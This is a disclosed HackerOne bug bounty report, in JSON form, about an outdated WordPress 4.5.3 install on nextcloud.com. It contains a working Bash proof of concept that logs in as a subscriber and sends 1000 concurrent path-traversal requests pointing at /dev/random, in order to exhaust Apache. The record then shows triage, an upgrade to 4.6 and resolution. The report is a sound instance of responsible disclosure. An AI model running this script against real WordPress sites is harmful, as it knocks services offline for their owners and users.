{"id":163421,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjM0MjE=","url":"https://hackerone.com/reports/163421","title":"Wordpress: Directory Traversal / Denial of Serivce","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-08-25T20:02:55.338Z","submitted_at":"2016-08-25T20:02:55.338Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"tbehroz","url":"/tbehroz","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/043/862/89e297842a1e2cff72338c44284452ffbaf0d59b_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13291,"url":"https://hackerone.com/nextcloud","handle":"nextcloud","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Nextcloud","twitter_handle":"nextclouders","website":"https://nextcloud.com","about":"Access, share and protect your files, calendars, contacts, communication \u0026 more at home and in your enterprise."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-08-26T08:52:53.883Z","bug_reporter_agreed_on_going_public_at":"2016-08-26T08:52:53.786Z","team_member_agreed_on_going_public_at":"2016-08-26T08:50:14.017Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello Security team,\nWhile testing nextcloud.com i have found that you are not using the lastest version of wordpress you are using old version 4.5.3 which is vulnerable to Directory Traversal / Denial of Serivce\n\nDescription :\n\nA path traversal vulnerability was found in the Core Ajax handlers of the WordPress Admin API. This issue can be used by an Subscriber to create a denial of service.\n\nPOC\n\nThe following Bash script can be used to exploit this vulnerability\n```\n#!/bin/bash\ntarget=\"https://nextcloud.com\"\nusername=\"subscriber\"\npassword=\"password\"\ncookiejar=$(mktemp)\n\n# login\ncurl --cookie-jar \"$cookiejar\" \\\n   --data \"log=$username\u0026pwd=$password\u0026wp-submit=Log+In\u0026redirect_to=%2f\u0026testcookie=1\" \\\n   \"$target/wp-login.php\" \\\n   \u003e/dev/null 2\u003e\u00261\n\n# exhaust apache\nfor i in `seq 1 1000`\n   do\n      curl --cookie \"$cookiejar\" \\\n      --data \"plugin=../../../../../../../../../../dev/random\u0026action=update-plugin\" \\\n      \"$target/wp-admin/admin-ajax.php\" \\\n      \u003e/dev/null 2\u003e\u00261 \u0026\ndone\n\nrm \"$cookiejar\"\n```\n### FIX :\n\nUpgrade your wordpress to 4.6\n\nMore details about vulnerability : `https://sumofpwn.nl/advisory/2016/path_traversal_vulnerability_in_wordpress_core_ajax_handlers.html`","vulnerability_information_html":"\u003cp\u003eHello Security team,\u003cbr\u003e\nWhile testing nextcloud.com i have found that you are not using the lastest version of wordpress you are using old version 4.5.3 which is vulnerable to Directory Traversal / Denial of Serivce\u003c/p\u003e\n\n\u003cp\u003eDescription :\u003c/p\u003e\n\n\u003cp\u003eA path traversal vulnerability was found in the Core Ajax handlers of the WordPress Admin API. This issue can be used by an Subscriber to create a denial of service.\u003c/p\u003e\n\n\u003cp\u003ePOC\u003c/p\u003e\n\n\u003cp\u003eThe following Bash script can be used to exploit this vulnerability\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"c\"\u003e#!/bin/bash\u003c/span\u003e\n\u003cspan class=\"nv\"\u003etarget\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;https://nextcloud.com\u0026quot;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003eusername\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;subscriber\u0026quot;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003epassword\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003ecookiejar\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"si\"\u003e$(\u003c/span\u003e\u003cspan class=\"nb\"\u003emktemp\u003c/span\u003e\u003cspan class=\"si\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"c\"\u003e# login\u003c/span\u003e\ncurl \u003cspan class=\"nt\"\u003e--cookie-jar\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$cookiejar\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n   \u003cspan class=\"nt\"\u003e--data\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;log=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$username\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026amp;pwd=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$password\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026amp;wp-submit=Log+In\u0026amp;redirect_to=%2f\u0026amp;testcookie=1\u0026quot;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n   \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$target\u003c/span\u003e\u003cspan class=\"s2\"\u003e/wp-login.php\u0026quot;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n   \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e/dev/null 2\u0026gt;\u0026amp;1\n\n\u003cspan class=\"c\"\u003e# exhaust apache\u003c/span\u003e\n\u003cspan class=\"k\"\u003efor \u003c/span\u003ei \u003cspan class=\"k\"\u003ein\u003c/span\u003e \u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"nb\"\u003eseq \u003c/span\u003e1 1000\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\n   \u003cspan class=\"k\"\u003edo\n      \u003c/span\u003ecurl \u003cspan class=\"nt\"\u003e--cookie\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$cookiejar\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e--data\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;plugin=../../../../../../../../../../dev/random\u0026amp;action=update-plugin\u0026quot;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n      \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$target\u003c/span\u003e\u003cspan class=\"s2\"\u003e/wp-admin/admin-ajax.php\u0026quot;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n      \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\n\u003cspan class=\"k\"\u003edone\n\n\u003c/span\u003e\u003cspan class=\"nb\"\u003erm\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$cookiejar\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"fix\"\u003eFIX :\u003c/h3\u003e\n\n\u003cp\u003eUpgrade your wordpress to 4.6\u003c/p\u003e\n\n\u003cp\u003eMore details about vulnerability : \u003ccode\u003ehttps://sumofpwn.nl/advisory/2016/path_traversal_vulnerability_in_wordpress_core_ajax_handlers.html\u003c/code\u003e\u003c/p\u003e\n","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-09-25T08:50:14.123Z","allow_singular_disclosure_after":-134423251.0894844,"singular_disclosure_allowed":true,"vote_count":6,"voters":["an0nym0us","khizer47","tbehroz","spetr0x","dyabla","sabeeralikhan0"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1154529,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us!\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.","markdown_message":"\u003cp\u003eThanks a lot for reporting this potential issue back to us!\u003c/p\u003e\n\n\u003cp\u003eOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we\u0026#39;d like to ask you to not disclose this issue to any other party.\u003c/p\u003e\n","automated_response":true,"created_at":"2016-08-25T20:02:55.539Z","updated_at":"2016-08-25T20:02:55.539Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1154574,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks. I'll escalate this internally and get back to you once I have more information.","markdown_message":"\u003cp\u003eThanks. I\u0026#39;ll escalate this internally and get back to you once I have more information.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-25T20:23:33.588Z","updated_at":"2016-08-25T20:23:33.588Z","actor":{"username":"lukasreschke","cleared":false,"url":"/lukasreschke","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1155352,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-26T08:41:54.066Z","updated_at":"2016-08-26T08:41:54.066Z","additional_data":{"duplicate_report_id":163441},"actor":{"username":"itsaj3","cleared":false,"url":"/itsaj3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/069/314/29367627bd7a98e0630240d7e0d33bc84a836461_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1155363,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks a lot for your report. We've now finished updating to Wordpress 4.6.","markdown_message":"\u003cp\u003eThanks a lot for your report. We\u0026#39;ve now finished updating to Wordpress 4.6.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-26T08:49:49.166Z","updated_at":"2016-08-26T08:49:49.166Z","actor":{"username":"lukasreschke","cleared":false,"url":"/lukasreschke","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"tbehroz","url":"/tbehroz"},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1155364,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-26T08:50:01.538Z","updated_at":"2016-08-26T08:50:01.538Z","additional_data":{"old_title":"Directory Traversal / Denial of Serivce","new_title":"Wordpress: Directory Traversal / Denial of Serivce"},"actor":{"username":"lukasreschke","cleared":false,"url":"/lukasreschke","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1155365,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-26T08:50:09.668Z","updated_at":"2016-08-26T08:50:09.668Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1155366,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-26T08:50:14.083Z","updated_at":"2016-08-26T08:50:14.083Z","first_to_agree":true,"actor":{"username":"lukasreschke","cleared":false,"url":"/lukasreschke","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1155372,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-26T08:52:53.823Z","updated_at":"2016-08-26T08:52:53.823Z","actor":{"username":"tbehroz","cleared":true,"url":"/tbehroz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/862/89e297842a1e2cff72338c44284452ffbaf0d59b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1155373,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-26T08:52:53.912Z","updated_at":"2016-08-26T08:52:53.912Z","actor":{"username":"tbehroz","cleared":true,"url":"/tbehroz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/862/89e297842a1e2cff72338c44284452ffbaf0d59b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}